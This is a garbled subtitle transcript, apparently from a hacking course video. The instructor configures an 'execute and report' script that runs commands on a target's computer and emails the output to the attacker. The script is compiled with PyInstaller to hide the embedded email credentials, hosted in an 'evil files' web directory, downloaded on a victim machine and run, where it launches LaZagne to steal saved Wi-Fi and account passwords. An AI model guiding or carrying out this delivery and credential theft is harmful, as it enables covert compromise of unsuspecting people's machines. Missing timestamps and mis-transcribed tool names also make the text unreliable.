Now, like I said, this script can be used to execute any command and it will just send you the result

4

of the command by email.

5
00:00:23,200 --> 00:00:28,780
So it's literally what you see in here is going to be sent to you by the email.

6
00:00:29,300 --> 00:00:35,930
Once you have the command there, you want to set your email in here and your password here and save

7
00:00:35,930 --> 00:00:36,380
this.

8
00:00:36,410 --> 00:00:39,410
Now this is ready to be sent to the target person.

9
00:00:39,440 --> 00:00:41,210
There is only one problem though.

10
00:00:41,240 --> 00:00:46,910
You can see that your username and password can be read in plain text in this script.

11
00:00:47,330 --> 00:00:53,960
So if the target person for some reason decides to open the code, they'll actually see your username

12
00:00:53,960 --> 00:00:56,150
and password, which is not very smart.

13
00:00:56,180 --> 00:01:02,990
So what we want to do is we want to compile this file to an executable so that even if the target person

14
00:01:02,990 --> 00:01:08,600
tries to read it, they'll just see gibberish and they won't be able to see your username and password.

15
00:01:09,230 --> 00:01:12,620
To do that, we're going to use a tool called Pyinstaller.

16
00:01:12,620 --> 00:01:16,880
And z logger actually automatically installs that tool for you.

17
00:01:16,880 --> 00:01:21,260
But if it's not installed, you can install it using Pip.

18
00:01:21,900 --> 00:01:24,720
Install Pi installer.

19
00:01:27,240 --> 00:01:31,200
So Pip is like a package or a library manager for Python.

20
00:01:31,590 --> 00:01:37,440
We're telling it that we want to install, and the name of the package that we want to install is called

21
00:01:37,440 --> 00:01:38,700
Pi installer.

22
00:01:39,320 --> 00:01:42,200
You hit enter and that'll install it for you.

23
00:01:42,200 --> 00:01:46,130
For me, you can see it's saying requirement is already satisfied.

24
00:01:46,130 --> 00:01:47,900
It's already installed for me.

25
00:01:47,900 --> 00:01:50,030
So I can use this now straight away.

26
00:01:50,420 --> 00:01:53,810
Now I need to go to where my script is saved.

27
00:01:53,810 --> 00:01:56,540
And you can see that it's saved in my downloads.

28
00:01:56,540 --> 00:01:58,430
So I need to navigate there.

29
00:01:58,430 --> 00:02:00,800
And I'm going to do that using the CD command.

30

So we're going to do CD.

31
00:02:03,210 --> 00:02:05,040
Root downloads.

32
00:02:07,260 --> 00:02:08,730
Now if we do, LZ.

33
00:02:10,170 --> 00:02:13,680
You can see I have my Z reporter right there.

34
00:02:14,460 --> 00:02:19,470
I'm actually just going to clear the screen and do this again so you can see it on top.

35
00:02:19,740 --> 00:02:25,380
And what we want to do now is to compile this Python file to an executable.

36
00:02:25,530 --> 00:02:28,200
And to do that we're going to use Pi installer.

37
00:02:30,800 --> 00:02:36,050
And we're going to tell it that we want you to combine anything and just put it in one file.

38

And then the name of the file that I want to compile is called Z reporter.

00:02:50,720 --> 00:02:56,720
And as you can see, once it's done, it's saying that my x is stored in the disk directory.

And you can see I have a new directory here in my downloads.

So if I just go in here.

44
00:03:03,140 --> 00:03:10,130
You can see I have an executable called Z reporter, and if I open this with my text editor.

45

You'll see.

00:03:18,390 --> 00:03:19,410
Nothing at all.

00:03:19,410 --> 00:03:23,370
So the user will not be able to see your username and password.

49
00:03:24,490 --> 00:03:28,660
So this is the file that we're going to be using to deliver to the target person.

50
00:03:28,660 --> 00:03:30,040
I'm going to copy it.

You can do this using the CP command from the terminal.

Or you can do it from the graphical interface like I'm doing it now.

53
00:03:37,240 --> 00:03:41,290
So I'm going to go to var HTML evil files.

54

And I'm going to paste my zero pointer here.

55

And that's it.

56
00:03:46,810 --> 00:03:50,050
That's ready to be delivered to the target.

57
00:03:50,560 --> 00:03:56,560
I'm going to go to my machine, to my ubuntu, and we're just going to download the file from here.

58
00:03:56,560 --> 00:04:01,180
We're going to go to HTTP ten 2014 213 Evil Files.

59
00:04:01,800 --> 00:04:05,040
And our file is called Z reporter.

00:04:06,190 --> 00:04:07,900
That's allowing me to download it.

61
00:04:07,900 --> 00:04:08,950
I'm going to save it.

62
00:04:09,860 --> 00:04:11,900
And that's going to go to my downloads.

63
00:04:12,320 --> 00:04:16,460
So if I lose here and my downloads, I've already done CD downloads.

00:04:16,460 --> 00:04:19,310
So if you're enroute you'll have to do CD downloads.

00:04:19,730 --> 00:04:24,110
And then when you do RLS you'll see I have Z reporter in here.

00:04:25,600 --> 00:04:28,240
Now this is not an executable as you can see.

So we do chmod plus x zero parter.

69

Deuel's again and we can see that Zero Porter is green.

Now, this is the exact same Python file that contains our execute and report code.

00:04:49,620 --> 00:04:57,480
The only difference is it's an executable now, so the contents of it cannot be read using a text editor.

72
00:04:57,480 --> 00:05:01,950
So we can execute this by doing dot forward slash file name.

73
00:05:03,530 --> 00:05:04,790
And what this is going to do.

74
00:05:04,790 --> 00:05:12,530
It should download Luzanne, execute it and send an email of the result to John Wick 70 at gmail.com.

00:05:12,560 --> 00:05:16,910

You can see that it managed to find my Wi-Fi network, but it couldn't find its password because it

If lasagne was executed by root, it will be able to find the Wi-Fi password.

So it was a login to accounts at google.com.

85
00:06:04,400 --> 00:06:10,610
Now this just shows you one example of the use of the Execute and Report tool.

86
00:06:10,610 --> 00:06:15,800
Like I said, you can use that tool to execute any command that you want and send the report to your

87
00:06:15,800 --> 00:06:18,470
email so you can get it to read passwords files.

88
00:06:18,470 --> 00:06:24,560
You can get it to list contents of files, upload files or download files, or do anything that you

89
00:06:24,560 --> 00:06:26,990
want really on the target computer.

90
00:06:27,020 --> 00:06:32,960
I just thought it's a good idea to combine this script with Luzanne, since Luzanne is a post-exploitation

91
00:06:32,960 --> 00:06:37,220
tool, and it cannot be used unless you hack into the target computer.

92
00:06:37,220 --> 00:06:43,730
But when we used with this script, we can see that we can just package, listen and send it as a standalone,

93
